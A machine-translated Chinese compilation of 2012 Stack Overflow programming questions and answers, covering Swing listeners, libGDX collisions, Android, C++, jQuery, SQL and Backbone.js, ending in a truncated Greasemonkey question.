我有一个名为 FrontGUI 的主框架，其中添加了一个侧面板。这个侧面板是一个名为 FrontGUILinker 的类，它扩展了 JPanel，并且上面有一个按钮。当我运行该程序时，该按钮不执行任何操作 - ActionListener 似乎从未被调用过。我还有其他几个具有类似设置的组件，并且按钮都可以在它们上工作 - 我能看到的唯一区别是它们是 JFrame 的扩展，它们不是 FrontGUI 的直接字段，而是下面代码中提到的 maingui . 这个 maingui 包含每个帧的 Controller 类的字段，包括 FrontGUIController，但 FrontGUILinkerController 是 FrontGUIController 中的一个字段。以下是我的课程大纲，希望只省略不相关的内容。主要的 JFrame 类：

```
public class FrontGUI extends JFrame {
    public FrontGUILinker linkerPanel;
    public JButton btnShowhideLinker;

    public FrontGUI() {
      linkerPanel = new FrontGUILinker();
      contentPane.add(linkerPanel, BorderLayout.EAST);

      btnShowhideLinker = new JButton("Show/Hide Linker");
      contentPane.add(btnShowhideLinker);
    }
} 
```

这是它的“控制器”类。侧面板可以显示或不显示，这是这个动作监听器所做的，这似乎工作得很好。

```
public class FrontGUIController {
    public MAINGUI maingui;
    private FrontGUI frame;
    public FrontGUILinkerController linkerController;

    public FrontGUIController(MAINGUI parent) {
       maingui = parent;
       frame = new FrontGUI();
       linkerController = new FrontGUILinkerController(maingui);

       //Button: Show/Hide linkerPanel
       frame.btnShowhideLinker.addActionListener( new ActionListener() {
       @Override
       public void actionPerformed(ActionEvent arg0) {
           frame.linkerPanel.setVisible(!frame.linkerPanel.isVisible());
       }});

    }

} 
```

这是 FrontGUILinker 类：

```
public class FrontGUILinker extends JPanel {
   public btnCreateLink;

   public FrontGUILinker() {
       btnCreateLink = new JButton("Create Link");
       add(btnCreateLink);
   }
} 
```

这是该类的控制器：

```
public class FrontGUILinkerController {
   public MAINGUI maingui;
   private FrontGUILinker frame;

   public FrontGUILinkerController(MAINGUI parent) {
      maingui = parent;
      frame = new FrontGUILinker();

      // Add listener to Create Link button
      frame.btnCreateLink.addActionListener( new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent arg0) {
             System.out.println("Create Link button has been clicked");
         }});
   }
} 
```

有人知道为什么这不起作用吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:11:09.343

您创建了***两次***FrontGUILinker 实例，一个是显示的，另一个是添加 ActionListener 的。不要那样做。创建一次此对象并为两者使用相同的引用。为了证明我是对的，只需查看上面问题中的代码，然后搜索你调用的位置`new FrontGUILinker()`，你会发现你做了两次，在这里：

```
public FrontGUI() {
  linkerPanel = new FrontGUILinker(); 
```

再次在这里：

```
public FrontGUILinkerController(MAINGUI parent) {
  maingui = parent;
  frame = new FrontGUILinker(); 
```

每个实例都与另一个完全不同，因此向其中一个实例添加 ActionListener 对另一个实例（显示的实例）没有影响。要解决此问题，请将有效引用传递到需要它们的位置。

IE，

```
public class FrontGUILinkerController {
   public MAINGUI maingui;
   private FrontGUILinker frame;

   // **** note change
   public FrontGUILinkerController(MAINGUI parent, FrontGUILiner frame) {
      maingui = parent;
      this.frame = frame;  // **** added
      // frame = new FrontGUILinker(); // **** commented out

      // Add listener to Create Link button
      frame.btnCreateLink.addActionListener( new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent arg0) {
             System.out.println("Create Link button has been clicked");
         }});
   }
} 
```

和

```
public FrontGUIController(MAINGUI parent) {
   maingui = parent;
   frame = new FrontGUI();
   linkerController = new FrontGUILinkerController(maingui, frame); // **** changed 
```

# android - Android Libgdx 和碰撞检测

> ID：13537322
> 
> 赞同：1
> 
> 时间：2012-11-24T00:48:58.577
> 
> 标签：android, collision-detection, libgdx

对于我的 android 游戏，我使用 Libgdx，并且我检测到 Bob (Omino) 和 Plant (Pianta) 之间的碰撞，这段代码运行良好： ![图片1](../Images/441f0142df20fb9a049105f012645917.png) **Assets.class**

```
pianta = new Animation(0.5f,new TextureRegion(items, 160, 384, 64, 96),
                              new TextureRegion(items, 224, 384, 64, 96)); 
```

**钢琴类**

```
public class Pianta extends GameObject {
   public static final float PIANTA_WIDTH = 2;
   public static final float PIANTA_HEIGHT = 3;
   public static float stateTime;
   public Pianta(float x, float y) {
      super(x, y, PIANTA_WIDTH, PIANTA_HEIGHT);   
      stateTime = 0;
   }

    public void update(float deltaTime) {
           stateTime += deltaTime;
       }

} 
```

**世界级**

```
Pianta pianta1_0 = new Pianta(x+10,2.2f);
piante.add(pianta1_0);

private void collisionPiante(){
      int len = piante.size();
      for(int i=0;i<len;i++){
         if(OverlapTester.overlapRectangles(piante.get(i).bounds,omino.bounds)){
            omino.ominoMorto();
         }
      }
   } 
```

**WorldRender.class**

```
private void renderPiante() {
      TextureRegion keyFrame;
      int len = world.piante.size();
        for(int i = 0; i < len; i++) {
            Pianta pianta = world.piante.get(i);            
            keyFrame = Assets.pianta.getKeyFrame(Pianta.stateTime, Animation.ANIMATION_LOOPING);
            batcher.draw(keyFrame,pianta.position.x, pianta.position.y, 2, 3);
        }

   } 
```

但是如果你看下面的图 2，你可以看到 Bob 击中但没有与石头碰撞（Pietra）！ ![图片2](../Images/d86ef13cce3055ff7f4c572b5f83fbdd.png) 这是代码：

**资产类**

```
pietra1 = new TextureRegion(items,288,416,128,64); 
```

**彼得拉类**

```
public class Pietra extends GameObject {
   public static float PIETRA_WIDTH = 4;
   public static float PIETRA_HEIGHT = 2;
   public Pietra(float x, float y) {
      super(x, y, PIETRA_WIDTH, PIETRA_HEIGHT);
   }

} 
```

**世界级**

```
Pietra pietra1_0 = new Pietra(x+25,2.2f);
pietre.add(pietra1_0);
private void collisionPietre(){
      int len2 = pietre.size();
      for(int l=0;l<len2;l++){
         if(OverlapTester.overlapRectangles(pietre.get(l).bounds,omino.bounds)){
            omino.ominoMorto();
         }
      }   
   } 
```

**WorldRender.class**

```
private void renderPietre() {
      int len = world.pietre.size();
        for(int i = 0; i < len; i++) {
            Pietra pietra = world.pietre.get(i);            
           batcher.draw(Assets.pietra1,pietra.position.x, pietra.position.y, 4, 2);
        }
   } 
```

**重叠测试仪**

```
public class OverlapTester {
    public static boolean overlapRectangles (Rectangle r1, Rectangle r2) {
        if (r1.x < r2.x + r2.width && r1.x + r1.width > r2.x && r1.y < r2.y + r2.height && r1.y + r1.height > r2.y)
            return true;
        else
            return false;
    } 
```

有人可以告诉我为什么即使没有碰撞，与植物的碰撞也能正常工作并且用石头击中鲍勃？如您所见，代码是相同的，唯一的区别是植物是动画对象，而石头不是。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:49:46.293

检查您的 OverlapTester。这就是 Libgdx 在 Rectangle.java 类中的做法：

```
/** @param rectangle the other {@link Rectangle}
 * @return whether this rectangle overlaps the other rectangle. */
public boolean overlaps (Rectangle rectangle) {
    return !(x > rectangle.x + rectangle.width || x + width < rectangle.x || y > rectangle.y + rectangle.height || y + height < rectangle.y);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T09:30:01.937

如果我理解正确的**重叠**矩形检查**矩形**是否完全在里面的情况。这可能不是你想要的。

LibGDX 具有用于碰撞检查的特殊功能。请检查[http://libgdx.badlogicgames.com/nightlies/docs/api/com/badlogic/gdx/math/Intersector.html](http://libgdx.badlogicgames.com/nightlies/docs/api/com/badlogic/gdx/math/Intersector.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-20T18:25:23.717

您可能希望用 Rectangle 的辅助函数*contains*替换您的 OverlapTester 。例如：

**世界级**

```
if(OverlapTester.overlapRectangles(piante.get(i).bounds,omino.bounds)){
    omino.ominoMorto();
} 
```

可：

```
if (piante.get(i).bounds.contains(omino.bounds)) {
    omino.ominoMorto();
} 
```

# java - 扩展导致程序崩溃的应用程序示例

> ID：13537323
> 
> 赞同：1
> 
> 时间：2012-11-24T00:49:34.710
> 
> 标签：java, api, android

我按照这个例子：

[http://www.intridea.com/blog/2011/5/24/how-to-use-application-object-of-android](http://www.intridea.com/blog/2011/5/24/how-to-use-application-object-of-android)

似乎它在`onCreate()`of `MyApplication`when 中崩溃了`singleton = this`。

```
public class MyApplication extends Application {

@Override
public void onConfigurationChanged(Configuration newConfig) {
    super.onConfigurationChanged(newConfig);
}
private static MyApplication singleton;

@Override
public void onCreate() {
    super.onCreate();
    Log.v("MyApplication", "Hi from my application");
    singleton = this;
    Log.v("MyApplication", "End onCreat of myApplicatoin");

}
@Override
public void onLowMemory() {
    super.onLowMemory();
}

@Override
public void onTerminate() {
    super.onTerminate();
}

public MyApplication getInstance(){
    return singleton;
}
public boolean isNetworkAvailable() {
    return true;
}

} 
```

来自 MainActivity 的代码：

```
MyApplication mApplication = (MyApplication) getApplicationContext(); 
```

以下是 logcat 消息：

```
11-23 16:43:01.398: V/MyApplication(30957): Hi from my application
11-23 16:43:01.398: E/AndroidRuntime(30957): FATAL EXCEPTION: main
11-23 16:43:01.398: E/AndroidRuntime(30957): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.jimmyc.fall12.OpenClass/com.jimmyc.fall12.OpenClass.MainInterface}: java.lang.NullPointerException
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2106)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2230)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread.access$600(ActivityThread.java:141)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1234)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.os.Handler.dispatchMessage(Handler.java:99)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.os.Looper.loop(Looper.java:137)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread.main(ActivityThread.java:5039)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at java.lang.reflect.Method.invokeNative(Native Method)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at java.lang.reflect.Method.invoke(Method.java:511)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at dalvik.system.NativeStart.main(Native Method)
11-23 16:43:01.398: E/AndroidRuntime(30957): Caused by: java.lang.NullPointerException
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.content.ContextWrapper.getApplicationContext(ContextWrapper.java:109)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at com.jimmyc.fall12.OpenClass.MainInterface.<init>(MainInterface.java:75)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at java.lang.Class.newInstanceImpl(Native Method)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at java.lang.Class.newInstance(Class.java:1319)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.Instrumentation.newActivity(Instrumentation.java:1054)
11-23 16:43:01.398: E/AndroidRuntime(30957):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2097)
> 11-23 16:43:01.398: E/AndroidRuntime(30957):  ... 11 more 
```

有任何想法吗？

MainInterface 的第 74、75、76 行

> 74: //////////////访问全局函数
> 
> 75: 我的应用程序 mApplication = (我的应用程序) getApplicationContext();
> 
> 76：//

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:06:54.373

您需要`mApplication`初始化`onCreate()`：

```
MyApplication mApplication;

public void onCreate(Bundle savedInstanceState) {
    ...
    mApplication = (MyApplication) getApplicationContext(); 
```

# c++ - 异常抛出不一致

> ID：13537324
> 
> 赞同：1
> 
> 时间：2012-11-24T00:49:59.110
> 
> 标签：c++, xcode

我一直在玩错误处理，并编写了一个简短的程序来尝试理解异常处理。我编写了以下程序，其中用户输入一个数字，该程序捕获 cin 抛出的任何异常：

```
#include <iostream>

int main()
{

    std::cin.exceptions(std::cin.failbit);
    int ReturnCode = 0;

    try{

        float Number;
        std::cout << "Number: \n";
        std::cin >> Number;
        std::cout << Number << "\n";

    }
    catch(...){

        std::cerr << "Input error \n";
        std::cin.clear();
        char BadInput[5];
        std::cin >> BadInput;
        ReturnCode = 1;
    };

    char StopChar;
    std::cout << "Press a key and enter: \n";
    std::cin >> StopChar;

    return ReturnCode;

} 
```

我在 Xcode 中编译了代码，但是在给出字符串时没有抛出异常。但是，当我使用终端和命令编译它时`g++ main.cpp -Wall -Wextra -o program`，一切正常。发生了什么，在 Xcode 中编译与使用终端编译有什么区别？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T16:04:38.853

这似乎是 libc++ 中的一个错误。

从 Xcode 编译时，默认设置是使用带有 libc++ 的 clang。而 g++ 使用 libstdc++。在 Xcode 中将 library 设置为 libstdc++ 会导致抛出异常。

# c++ - 自返班？

> ID：13537330
> 
> 赞同：2
> 
> 时间：2012-11-24T00:51:21.087
> 
> 标签：c++, class, reference, instantiation

我想知道（在 C++ 中）你是否可以实例化一个类（类 foo）然后说类返回已经实例化的对象。(foo::instance())

换句话说，我可以让一个类通过它自己的方法返回它自己吗？我希望能够在我的程序早期创建一个类（即类 foo），因此它已经设置好并准备就绪。然后，更进一步，我希望能够从该类调用函数，而不必将该对象作为参数传递给我的调用函数。我可以这样做： `MyClass::ReturnSelf()->foo();` 或 `MyClass::ReturnSelf().foo();`

编辑：我刚刚意识到这可能有点不清楚。我希望能够让另一个类调用这个“自返回”方法，这样它就可以使用已经实例化的对象的方法和成员，而无需创建新对象。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T00:52:54.007

恭喜，你发现了[单例模式](http://en.wikipedia.org/wiki/Singleton_pattern)。非常警告，如果你还不知道的话。

```
struct X
{
   static X& instance()
   {
       static X x;
       return x;
   }

   void foo();
}; 
```

并将方法称为：

```
X::instance().foo(); 
```

当然，您也可以创建 method `static`，如果这是一个选项，并直接调用它：

```
X::foo(); //this requires foo to be declared static 
```

从方法返回实例的效果也可以用于方法链接：

```
struct Element
{
    Element& setColor() { return *this; }
    Element& setWidth() { return *this; }
};

Element e;
e.setColor().setWidth(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:57:13.570

`static`成员函数通常可以解决问题：

```
struct Foo
{
    static Foo & special_instance()
    {
        static Foo impl;  // Alarm bells: This is a global state!
        return impl;
    }

    // ...
}; 
```

用法（从代码中的任何地方）：

```
Foo & f = Foo::special_instance();
// ... 
```

您还可以选择创建类的所有构造函数，`private`以便这种对象创建是*唯一*的选择。这通常是一种尴尬的设计，但在某些情况下它可能很有用。请注意您是否正确地模拟了您的问题，或者您是否可以使用更简单的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:58:04.163

> 我刚刚意识到这可能有点不清楚。我希望能够让另一个类调用这个“自返回”方法，这样它就可以使用已经实例化的对象的方法和成员，而无需创建新对象。

在 foo 类型的类 foo 中定义一个类变量，您可以在静态类方法 instance() 中返回它。你也可以尝试给它类型 *foo 并在第一个 ctor 上设置一个指针，这样就可以从你的类派生。

```
class Foo
{
   # class variable pointing to first instance
   static foo* pFoo = null;

   # constructor, sets pointer to first instance 
   Foo()
   {
      if (!pFoo) pFoo = this;
      /* ... */
   }

   # static class method returning instance
   static foo* instance() {return pFoo;}
} 
```

# jquery - JQuery 查找当前页面 URL

> ID：13537334
> 
> 赞同：0
> 
> 时间：2012-11-24T00:52:35.530
> 
> 标签：jquery, href, attr

我遇到的问题是我的网站使用 iFrame。所以这个当前的代码没有得到正确的 url，它只是将 desirednoise.com 作为页面 URL。即使用户在特定的帖子上。

```
jQuery('#player-facebook').on('click', function() {
var anchor = jQuery('#player-controls-info a');
if (anchor.attr('href') == '#') {
    var fbText = document.title;
    var fbUrl = window.location.href;
} else {
    var fbText = "I'm listening to " + anchor.text().substr(13);
    var fbUrl = anchor.attr('href');
}
var fbParams = {u: fbUrl,
                t: fbText};
jQuery(this).attr('href', 'https://www.facebook.com/sharer.php?'+jQuery.param(fbParams));
  });
  Player.playButton = jQuery('#player-play'); 
```

除此之外还有其他命令吗？.attr('href') 我可以使用吗？

这段代码转到我的自定义网站音乐播放器，它应该分享它当前正在播放的歌曲 which = 帖子的页面 url。它是一个音乐博客

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:55:24.443

如果 iFrame 在原始域之外，则无法获取它的当前 URL。这是一个安全限制。

在此处阅读有关同源政策的更多信息：

> [https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

# data-visualization - JgraphX 和 JgraphT 中的树布局

> ID：13537337
> 
> 赞同：2
> 
> 时间：2012-11-24T00:53:12.730
> 
> 标签：data-visualization, graph-visualization, jgrapht

我正在尝试为决策树（以及代数决策图世界中的一些改进，一旦可行）构建一个可视化工具，使用 JgraphT 来支持底层数据结构，并使用 JgraphX 将结构投射到屏幕上。（我对这两个包都是新手。）

我认为 JgraphX 有相当长的历史——似乎[Jgraph 5.13中的 Facade 和 TreeLayout 类将是朝着正确方向迈出的一步，但我在最近的](http://touchflow.googlecode.com/hg-history/75fada644b2a19c744130923cbd34747fba861a2/doc/jgraphmanual.pdf)[JgraphX](http://jgraph.github.com/mxgraph/docs/manual_javavis.html)包中找不到任何类似的东西。（如果我了解历史，Jgraph 在 5.13 版本发布后的某个时间被重命名为 JgraphX，并且版本号重新开始——对吗？）我也无法在任何地方找到旧的 Jgraph 5.13 jar 文件。

具体问题：

1.  Jgraph 5.13 是否存在于任何地方，有人可以指出它吗？
2.  JgraphX 是否支持不同名称或范式下的相同树布局功能？

任何帮助将不胜感激，否则我将不得不处理 JgraphT/JgraphX，直到我从头开始拥有一个树布局工具，这不符合我对“乐趣”的定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T16:00:57.763

JGraphX 是从头开始完全重写的，这就是为什么我们没有将其称为 JGraph 6 并且版本控制从 1.0 开始。

JGraphX 中确实有树/分层布局。

显然，JGraphT 与我们无关，所以很遗憾他们没有更新。[我们的论坛上](http://forum.jgraph.com/questions/133/using-jgraphx-to-visualize-jgrapht)有一篇与此相关的帖子。我没有测试过这座桥，但这个想法是正确的。

顺便说一句，JGraphX 也有自己的分析包。您可能想检查这是否满足您的需求以及您是否需要 JGraphT。

[我们确实在此处](http://www.jgraph.com/jgraph5archive.html)提供了 JGraph 5 更高版本的下载。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T19:01:46.843

我的怀疑似乎是正确的：Jgraph 在其演变为 JgraphX 的过程中发生了显着变化，而 JgraphT 没有（或不会）赶上它。如果使用旧版本的 Jgraph（不超过 5.xx），则从 JgraphT 导出到 Jgraph 格式效果会更好——然后外观、布局工具等可以正确连接。

在这里可以找到旧版本的 Jgraph，版本 5.13.00 [。](http://mvnrepository.com/artifact/jgraph/jgraph/5.13.0.0)

# excel - 如何评估excel中的数据块？

> ID：13537339
> 
> 赞同：1
> 
> 时间：2012-11-24T00:53:22.033
> 
> 标签：excel, logic

在excel中我有以下格式的数据（对不起格式化，管理员不允许我上传图片）

1.  通过通过通过
2.  通过通过通过
3.  失败通过通过

现在：

*   1, 2 rows --> Valid PASS, as A, B, C pass
*   3 --> 无效 PASS，因为 A 失败

请帮我写一个计算所有列“通过”的行的公式（请不要宏，它在我们研究所被阻止）例如：#1,2 行是有效的 PASS，我需要计算所有这些有效的 PASS 行表，在上面的代码片段中是 2

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:56:36.450

如果您只需要进行计数，可以尝试`SUMPRODUCT`：

```
=SUMPRODUCT(--(A:A="PASS"), --(B:B="PASS"),--(C:C="PASS")) 
```

或`COUNTIFS`：

```
=COUNTIFS(A:A,"Pass",B:B, "Pass",C:C,"Pass") 
```

# sql - SQL Server 日期时间文化（本地化）头痛

> ID：13537341
> 
> 赞同：1
> 
> 时间：2012-11-24T00:54:22.880
> 
> 标签：sql, datetime, localization, culture

SQL Server 2005\. Visual Studio 2010\. ASP.NET 2.0 Web 应用程序

这是一个支持多种语言的网络应用程序，其中一种是韩语。我在查询字符串中有“langid”来区分不同的语言，如果 langid=3 它是韩语。

在我的 C# 代码后面的代码中，我使用以下查询读取了一个表：

```
"select * from Reservations where rsv_id = 1234" 
```

表中有一个名为“rsv_date”的列，它是预订日期，类型为 datetime。在 db 表中，它的值为“11/22/2012 4:14:37 PM”。我在 SQL Server Management Studio 中检查了这一点。但是当我读出来时，我得到了“2012-11-22 오후 4:14:37”！那个韩语“오후”是从哪里来的？？？是因为任何地方的文化背景吗？但我看不到在我的代码或 SQL Server 中的位置。这给我带来了问题，因为当我修改这条记录时，它会尝试将“2012-11-22 오후 4:14:37”写入db，这当然是SQL server报错。

我的原始代码：

```
Hashtable reservation = new Hashtable();
SqlCommand sqlCommand = null;
SqlDataReader dataReader;
string queryCommand = "select * from Reservations where rsv_id = @RsvID";
sqlCommand = new SqlCommand(queryCommand, getConnection());
sqlCommand.Connection.Open();
sqlCommand.Parameters.AddWithValue("@RsvID", rsvID);
dataReader = sqlCommand.ExecuteReader();
while (dataReader.Read())
{
reservation["rsvID"] = dataReader["rsv_id"];
reservation["rsvCode"] = dataReader["rsv_code"];
reservation["rsvType"] = dataReader["rsv_type"];
reservation["rsvDate"] = dataReader["rsv_date"]; // where does Korean come from?
...
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-06T16:08:24.643

一个常见的误解是您可以“检查”数据库中日期时间字段的格式。您在屏幕上看到的格式将始终取决于客户端，即使客户端是“SQL Server Management Studio”。在数据库中，日期时间以很少需要知道的二进制格式存储。

因此，韩语字符来自客户端，在这种情况下是您自己的程序。是的，它们将取决于某个地方的某种文化背景。

您的示例没有显示 reservation["rsvDate"] 会发生什么，用韩语字符显示的值在哪里？您如何尝试将带有韩文字符的值写入数据库？

为避免使用韩语字符，您可以在使用 Date 值的地方使用 .ToString(CultureInfo.InvariantCulture)。

# sql - 获取 column2 为 X 且 column1 为 column1 最大值的行

> ID：13537347
> 
> 赞同：3
> 
> 时间：2012-11-24T00:55:45.920
> 
> 标签：sql, sqlite

我有一个这样的 SQLite 表：

```
Col1  Col2  Col3
1     ABC   Bill
2     CDE   Fred
3     FGH   Jack
4     CDE   June 
```

我想找到包含 CDE 的 Col2 值的行，该值具有最大的 Col1 值，即在本例中为 6 月。或者，换一种说法，最近添加的行的 col2 值为 CDE，因为 Col1 是一个自动递增列。实现此目的的 SQL 查询字符串是什么？我需要这样做是有效的，因为查询将在一个循环中运行许多迭代。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:48:04.910

尝试这个：

```
SELECT t1.*
FROM table1 t1
INNER JOIN
(
   SELECT MAX(col1) MAXID, col2
   FROM table1
   GROUP BY col2
) t2 ON t1.col1 = t2.maxID AND t1.col2 = t2.col2
WHERE t1.col2 = 'CDE'; 
```

## [SQL 小提琴演示](http://sqlfiddle.com/#!2/4ca38/9)¹

* * *

1：^(这个demo是mysql，但在sqlite中使用相同的语法应该可以正常工作。)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T01:01:58.847

```
SELECT * FROM table WHERE col2='CDE' ORDER BY col1 DESC LIMIT 1 
```

如果 col1 不是增量，它会有点像

```
SELECT *,MAX(col1) AS max_col1 FROM table WHERE col2='CDE' GROUP BY col2 LIMIT 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T01:03:06.487

使用子查询，例如：

```
SELECT Col1, Col2, Col3
FROM table
WHERE Col1 = (SELECT MAX(Col1) FROM table WHERE Col2='CDE') 
```

根据需要添加索引，例如 Col1 上的聚集索引和 Col2 上的另一个非聚集索引以加快子查询。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-24T10:03:08.423

在 SQLite 3.7.11 及更高版本中，最简单的查询是：

```
SELECT *, max(Col1) FROM MyTable WHERE Col2 = 'CDE' 
```

如[EXPLAIN QUERY PLAN](http://www.sqlite.org/eqp.html)所示，如果 上有索引，则 this 和 passby 的查询都是最有效的`Col2`。

* * *

如果您想查看*所有* `Col2`值的对应值，请改用如下查询：

```
SELECT *, max(Col1) FROM MyTable GROUP BY Col2 
```

# c++ - 使用可变参数模板模板进行类型推导和参数传递

> ID：13537349
> 
> 赞同：2
> 
> 时间：2012-11-24T00:56:14.457
> 
> 标签：c++, templates, c++11, rvalue-reference, template-templates

多亏了可变参数模板，我不久前实现了 Python 的链函数的 C++ 等价物。该函数用于连续迭代多个容器。这是使用名为 的生成器的函数的旧工作版本`ChainedObject`，无论它是什么：

```
template<typename... Iterables>
auto chain(Iterables&&... iters)
    -> ChainObject<Iterables...>
{
    return /* ... */;
} 
```

以及相应的主要：

```
int main()
{
    std::vector<int> vec = { 1, 2, 3, 4, 5 };
    std::list<int>   li  = { 6, 7, 8, 9, 10, 11, 12, 13 };
    for (auto& i: chain(vec, li))
    {
        // You can edit a range of iterables
        // as if there was only one of them.
        i *= 5;

        std::cout << i << std::endl;
    }
    return 0;
} 
```

那个主要工作得很好。我们不在乎 ChainObject 中有什么问题，所以让我们看看。我尝试使用模板模板来确保使用的不同集合具有相同的功能，并通过以下方式`value_type`修改了函数：`chain`

```
template<typename T, template<typename...> class... Iterables>
auto chain(Iterables<T>&&... iters)
    -> ChainObject<T, Iterables...>
{
    return /* ... */;
} 
```

我认为这可以确保我之前的 main 中的`list`and`vector`共享相同的类型，但是相反，我从 GCC 4.7.1 收到以下错误：

> 在函数'int main()'中：
> 
> 错误：没有匹配函数调用“链（std::vector&，std::list&）”
> 
> 注：候选人是：
> 
> 注意：`ChainObject<T, Iterables ...> chain(Iterables<T>&& ...) [with T = int; Iterables = {std::vector, std::list}`]
> 
> 注意：没有已知的参数 2 从 ' `std::list<int>`' 到 ' `std::list<int>&&`' 的转换
> 
> 笔记：`ChainObject<T, Iterables ...> chain(Iterables<T>&& ...) [with T = int; Iterables = {std::vector, std::list}]`
> 
> 注意：没有已知的参数 2 从 ' `std::list<int>`' 到 ' `std::list<int>&&`' 的转换
> 
> 错误：无法从 '' 推导出 'auto&'

似乎问题出在将参数传递给采用右值引用的函数。但是，我真的不明白为什么我的第一个版本运行良好，并注意使用模板模板的版本。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T01:13:24.233

您的问题是`T&&`模板魔术仅适用于类型参数（它通过推断`T`例如，`int&`如果需要 - 对于左值参数）。它不适用于模板模板参数，其中实际类型是`X<T>&&`-`X`在这种情况下必须是类模板，而不是“reference-to-class-template”之类的东西。所以最后你必须传递一个右值引用，你不能从左值（变量）中隐式获取它。

也就是说，我建议您恢复到之前的代码并检查`value_type`s 是否与 SFINAE 相同（或兼容等，无论您如何进行）。

粗略的代码草图（严格相等）：

```
template <class ... Ts> struct all_types_equal
{
  static const bool value = false;
};

template <class T>
struct all_types_equal<T>
{
  static const bool value = true;
};
template <class T, class ... Rest>
struct all_types_equal<T, T, Rest...>
{
  static const bool value = all_types_equal<T, Rest...>::value;
};

template<typename... Iterables>
auto chain(Iterables&&... iters)
    -> typename std::enable_if<all_types_equal<Iterable::value_type...>::value, ChainObject<Iterables...> >::type 
```

# backbone.js - 骨干视图 El 混乱

> ID：13537351
> 
> 赞同：-1
> 
> 时间：2012-11-24T00:56:50.930
> 
> 标签：backbone.js

我好像遇到了问题

任何人都可以发现为什么没有放入 div id“app”？

[http://jsfiddle.net/suN5n/1/](http://jsfiddle.net/suN5n/1/)

从链接：

JS-

```
 var MyModel = Backbone.Model.extend();
var data = {
    first: 'hello',
    second: 'there'
};
var myModel = new MyModel(data);

var MyView = Backbone.View.extend({
    model: myModel,
    el: $('#app'),
    initialize: function(){
        this.render();     
    },

    render: function(){
        this.$el.html(this.model.toJSON());                        
    }        
});

var myView = new MyView(); 
```

​我确定只是我是一个 BackboneJS 菜鸟。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:04:47.963

哦，你正试图将一个对象传递给`.html`它只需要一个字符串的时候。`JSON.stringify(this.model.toJSON())`如果你想做一些奇怪的事情，请使用。

# javascript - Greasemonkey：如何点击某个按钮

> ID：13537356
> 
> 赞同：0
> 
> 时间：2012-11-24T00:58:17.843
> 
> 标签：javascript, greasemonkey

我是 JavaScript 新手：与 Java 非常不同大声笑：P 我想知道我是否有一个按钮，我怎么能以 4-5 分钟的间隔连续按下该按钮？以下是页面来源：

```
<head><title>A>
<link rel="stylesheet" href="i/w/i_style0n.css">
</head>
<body bgcolor=black topmargin=0 leftmargin=0 rightmargin=0 bottommargin=0>
<img src=i/w/sp_.gif height=2><br><table align=center cellspacing=0 cellpadding=2 width=800 style="border:solid 1px yellow;color:white;" bgcolor=#383838><tr><td align=center> &nbsp; <a href=/p/en/forum/read/100/29291/ target=blank>Raffle 12/11/12-25/11/12 </a> {<a href=hef.cfm?&3831&f=hef_detail&hi=29291&ch=100 target=_Blank>UC0</a>} ( <a href=/p/en/forum/read/100/28080/ target=_blank>Details</a> {<a href=hef.cfm?&3831&f=hef_detail&hi=28080&ch=100 target=_Blank>UC0</a>} . <a href=/p/en/forum/read/100/28201/ target=_blank>Winners</a> {<a href=hef.cfm?&3831&f=hef_detail&hi=28201&ch=100 target=_Blank>UC0</a>} ) - <a href=/p/en/forum/read/200/118678/ target=_Blank>Minor updates</a> {<a href=hef.cfm?&8950&f=he_detail&hi=118678&ch=200 target=_Blank>UC0</a>} - <a href=/p/en/forum/read/100/29293/ target=_Blank>Xmas Event </a> {<a href=hef.cfm?&3831&f=hef_detail&hi=29293&ch=100 target=_Blank>UC0</a>} &nbsp; </td></tr></table><img src=i/w/sp_.gif 